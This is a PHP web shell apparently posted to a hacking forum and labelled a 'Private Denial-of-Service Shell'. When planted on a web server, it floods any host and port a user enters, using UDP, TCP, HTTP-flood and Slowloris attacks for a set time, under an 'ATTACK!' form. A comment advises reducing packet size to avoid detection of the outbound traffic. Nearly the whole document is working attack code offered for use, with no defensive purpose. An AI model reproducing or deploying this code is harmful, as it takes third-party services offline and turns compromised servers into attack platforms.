
<?php 
if(isset($_GET['method'])) 
{ 
$bytes = 65000; 
/* 
* 65000 bytes is the around max packet size in 
* TCP and UDP 
* 
* lower ths to be secretive about the shell being on 
* the web server - you will have less chance of the 
* outbound packets being caught. 
*/ 
  
if(empty($_GET['ip']) || empty($_GET['port']) || empty($_GET['length'])) 
{ 
exit("You've forgotten something."); 
} 
  
if($_GET['method'] == "udp") 
{ 
ignore_user_abort(true); 
set_time_limit(0); 
  
ob_start(); 
echo "Attack sent!"; 
$s = ob_get_length(); 
  
header("Content-Length: {$s}"); 
header("Content-Encoding: none"); 
header("Connection: close"); 
  
ob_end_flush(); 
ob_flush(); 
flush(); 
  
if(session_id()) session_write_close(); 
  
$n = 0; 
$packet = ''; 
do 
{ 
switch($n) 
{ 
case 0: 
$packet .= 'A'; 
break; 
  
case 1: 
$packet .= 'S'; 
break; 
  
case 2: 
$packet .= 'D'; 
break; 
  
case 3: 
$packet .= 'A'; 
break; 
} 
  
$n++; 
if($n == 4) $n = 0; 
} while(strlen($packet) != $bytes); 
  
$running = true; 
  
$runFor = strtotime('now') + $_GET['length']; 
  
do 
{ 
if(strtotime('now') > $runFor) 
{ 
$running = false; 
} 
$sock = @fsockopen("udp://{$_GET['ip']}", $_GET['port'], $errno, $errstr, 10); 
  
if($sock) 
{ 
fwrite($sock, $packet); 
fclose($sock); 
} 
else 
{ 
$sock = @fsockopen("udp://{$_GET['ip']}", $_GET['port'], $errno, $errstr, 10); 
fwrite($sock, $packet); 
} 
} while($running == true); 
} 
elseif($_GET['method'] == "slowloris") 
{ 
ignore_user_abort(true); 
set_time_limit(0); 
  
ob_start(); 
echo "Attack sent!"; 
$s = ob_get_length(); 
  
header("Content-Length: {$s}"); 
header("Content-Encoding: none"); 
header("Connection: close"); 
  
ob_end_flush(); 
ob_flush(); 
flush(); 
  
if(session_id()) session_write_close(); 
  
$header = array(); 
$header[] = "GET / HTTP/1.1"; 
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7"; 
$header[] = "Host: {$_GET['ip']}"; 
$header[] = "Keep-Alive: 900"; 
$header[] = "Content-Length: " . mt_rand(100000, 1000000); 
$header[] = "Connection: keep-alive"; 
  
$sock = @fsockopen($_GET['ip'], $_GET['port'], $errno, $errstr); 
  
if($sock) 
{ 
fwrite($sock, implode("\r\n", $header)); 
  
$running = false; 
$runFor = strtotime('now') + $_GET['length']; 
  
do 
{ 
if(strtotime('now') > $runFor) 
{ 
$running = false; 
} 
  
if($sock) 
{ 
fwrite($sock, '.'); 
sleep(3); 
} 
else 
{ 
$sock = @fsockopen($_GET['ip'], $_GET['port'], $errno, $errstr); 
fwrite($sock, implode("\r\n", $header)); 
} 
} while($running == true); 
} 
} 
elseif($_GET['method'] == "tcp") 
{ 
ignore_user_abort(true); 
set_time_limit(0); 
  
ob_start(); 
echo "Attack sent!"; 
$s = ob_get_length(); 
  
header("Content-Length: {$s}"); 
header("Content-Encoding: none"); 
header("Connection: close"); 
  
ob_end_flush(); 
ob_flush(); 
flush(); 
  
if(session_id()) session_write_close(); 
  
$n = 0; 
$packet = ''; 
do 
{ 
switch($n) 
{ 
case 0: 
$packet .= 'A'; 
break; 
  
case 1: 
$packet .= 'S'; 
break; 
  
case 2: 
$packet .= 'D'; 
break; 
  
case 3: 
$packet .= 'A'; 
break; 
} 
  
$n++; 
if($n == 4) $n = 0; 
} while(strlen($packet) != $bytes); 
  
$running = true; 
  
$runFor = strtotime('now') + $_GET['length']; 
  
do 
{ 
if(strtotime('now') > $runFor) 
{ 
$running = false; 
} 
$sock = @fsockopen("tcp://{$_GET['ip']}", $_GET['port'], $errno, $errstr, 10); 
  
if($sock) 
{ 
fwrite($sock, $packet); 
fclose($sock); 
} 
else 
{ 
$sock = @fsockopen("tcp://{$_GET['ip']}", $_GET['port'], $errno, $errstr, 10); 
fwrite($sock, $packet); 
} 
} while($running == true); 
} 
elseif($_GET['method'] == "http") 
{ 
ignore_user_abort(true); 
set_time_limit(0); 
  
ob_start(); 
echo "Attack sent!"; 
$s = ob_get_length(); 
  
header("Content-Length: {$s}"); 
header("Content-Encoding: none"); 
header("Connection: close"); 
  
ob_end_flush(); 
ob_flush(); 
flush(); 
  
if(session_id()) session_write_close(); 
  
$header = array(); 
$header[] = "GET / HTTP/1.1"; 
$header[] = "Host: {$_GET['ip']}"; 
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7"; 
$header[] = "Keep-Alive: 300"; 
$header[] = "Content-Length: " . mt_rand(100000, 1000000); 
$header[] = "Connection: keep-alive"; 
  
$sock = @fsockopen($_GET['ip'], $_GET['port'], $errno, $errstr); 
  
if($sock) 
{ 
fwrite($sock, implode("\r\n", $header)); 
  
$running = false; 
$runFor = strtotime('now') + $_GET['length']; 
  
do 
{ 
if(strtotime('now') > $runFor) 
{ 
$running = false; 
} 
  
if($sock) 
{ 
fwrite($sock, '.'); 
fclose($sock); 
sleep(3); 
} 
else 
{ 
$sock = @fsockopen($_GET['ip'], $_GET['port'], $errno, $errstr); 
fwrite($sock, implode("\r\n", $header)); 
} 
} while($running == true); 
} 
} 
} 
?> 
  
<!DOCTYPE html> 
<html> 
<head> 
<meta charset="utf-8"> 
<meta name="author" content="ASDA"> 
<meta name="robots" content="noindex, nofollow"> 
<title>&nbsp;Private Denial-of-Service Shell | Created by ASDA | HackForums.net | </title> 
  
<style> 
html, body 
{ 
height: 100%; 
cursor: none; 
background: #000; 
color: #66ff33; 
overflow: hidden; 
} 
  
h1 
{ 
text-align: center; 
font-size: 50px; 
} 
  
#barX 
{ 
background: #66ff33; 
left: 0; 
top: 0; 
position: absolute; 
width: 1px; 
height: 100%; 
z-index: 1000; 
} 
  
#barY 
{ 
background: #66ff33; 
left: 0; 
top: 0; 
position: absolute; 
width: 100%; 
height: 1px; 
z-index: 1000; 
} 
  
input 
{ 
cursor: none; 
border: 1px solid #11ff00; 
margin-bottom: 20px; 
} 
  
form 
{ 
width: 50px; 
margin: auto; 
} 
  
label 
{ 
display: block; 
} 
  
iframe 
{ 
display: none; 
visibility: hidden; 
} 
  
</style> 
</head> 
  
<body> 
<div id="barY"></div> 
<div id="barX"></div> 
  
<div id="doColours"></div> 
  
<form action="<?php echo $_SERVER["SCRIPT_NAME"]; ?>" method="GET"> 
<label for="ip">Host:</label> 
<input type="text" name="ip" id="ip"> 
  
<label for="port">Port:</label> 
<input type="text" name="port" id="port"> 
  
<label for="length">Length:</label> 
<input type="text" name="length" id="length"> 
  
<label for="method">Method:</label> 
<select name="method" id="method"> 
<option value="slowloris">Slowloris</option> 
<option value="udp">UDP Flood</option> 
<option value="tcp">TCP Flood</option> 
<option value="http">HTTP Flood</option> 
</select> 
  
<br><br> 
  
<input type="submit" value="ATTACK!"> 
</form> 
  
  
<div id="youtube"></div> 
<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script> 
<script type="text/javascript"> 
$(document).ready(function(){ 
var title = document.title; 
setInterval(function(){title = title.substring(1, title.length) + title.substring(0, 1);document.title = title;}, 300); 
  
$("body").bind('mousemove', function(evt) { 
$("#barY").css({ 
"top": evt.pageY + 10 + "px" 
}); 
$("#barX").css({ 
"left": evt.pageX + 10 + "px" 
}); 
}); 
  
var youtubea = new Array(); 
youtubea[0] = "<iframe src=\"https://youtube.com/embed/zeIjmvZZ_SQ?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[1] = "<iframe src=\"https://youtube.com/embed/-ieJtn73e1w?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[2] = "<iframe src=\"https://youtube.com/embed/w1bRniqs774?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[3] = "<iframe src=\"https://youtube.com/embed/GqUN76-_Djg?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[4] = "<iframe src=\"https://youtube.com/embed/UDzNq1s7dAE?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[5] = "<iframe src=\"https://youtube.com/embed/DC9xwwmyS70?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[6] = "<iframe src=\"https://youtube.com/embed/liYyEqlvG1Y?autoplay=1#t=17s\" frameborder=\"0\"></iframe>"; 
youtubea[7] = "<iframe src=\"https://youtube.com/embed/K1VLaXoRRdk?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[8] = "<iframe src=\"https://youtube.com/embed/EZxeJV-G9kg?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[9] = "<iframe src=\"https://youtube.com/embed/JRwXku3nM1c?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[10] = "<iframe src=\"https://youtube.com/embed/oKpPd2hDrE4?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[11] = "<iframe src=\"https://youtube.com/embed/3Rd0LHQHjWg?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[12] = "<iframe src=\"https://youtube.com/embed/nuno2jOwOjo?autoplay=1\" frameborder=\"0\"></iframe>"; 
youtubea[13] = "<iframe src=\"https://youtube.com/embed/xLho8rMQpoI?autoplay=1\" frameborder=\"0\"></iframe>"; 
  
var rand = Math.floor(Math.random() * (youtubea.length + 1)); 
$('#youtube').html(youtubea[rand]); 
  
function doColour(a){setInterval(function(){for(var b=0;b<a.length;b++){$("#letter"+b).css({color:colour[b]})}for(var b=0;b<colour.length;b++){colour[b-1]=colour[b]}colour[colour.length-1]=colour[-1]},50)}function initColours(a){var b="\x41\x53\x44\x41\x27\x73\x20\x50\x72\x69\x76\x61\x74\x65\x20\x53\x68\x65\x6C\x6C".split("");var c="<h1>";$.each(b,function(a,b){c+="<span id='letter"+a+"'>"+b+"</span>"});c+="</h1>";$("#doColours").html(c);doColour(b);var d=1;setInterval(function(){while(colour.length<b.length){colour=colour.concat(colour)}d=Math.floor(Math.random()*colours.length);colour=colours[d]},5e3)}colours=new Array;colours[0]=new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");colours[1]=new Array("#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00","#00FF00","#000000","#00FF00","#00FF00");colours[2]=new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00");colours[3]=new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");colours[4]=new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");colours[5]=new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF","#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF","#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF","#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF","#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF");colours[6]=new Array("#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00","#0000FF","#FFFF00");colour=colours[4];initColours(); 
  
}); 
</script> 
</body> 
</html>
